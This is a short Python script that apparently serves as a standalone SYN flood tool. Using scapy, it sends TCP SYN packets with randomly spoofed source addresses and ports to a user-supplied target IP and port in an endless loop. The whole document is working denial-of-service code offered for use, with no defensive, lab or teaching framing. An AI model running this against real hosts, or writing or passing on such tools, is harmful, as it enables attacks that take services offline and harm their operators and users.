from scapy.all import IP, TCP, send
import random

def syn_flood(target_ip, target_port):
    print(f"[+] Starting SYN Flood on {target_ip}:{target_port}")
    
    while True:
        src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        src_port = random.randint(1024, 65535)
        packet = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
        send(packet, verbose=False)

if __name__ == "__main__":
    target_ip = input("Enter target IP: ")
    target_port = int(input("Enter target port: "))
    syn_flood(target_ip, target_port)
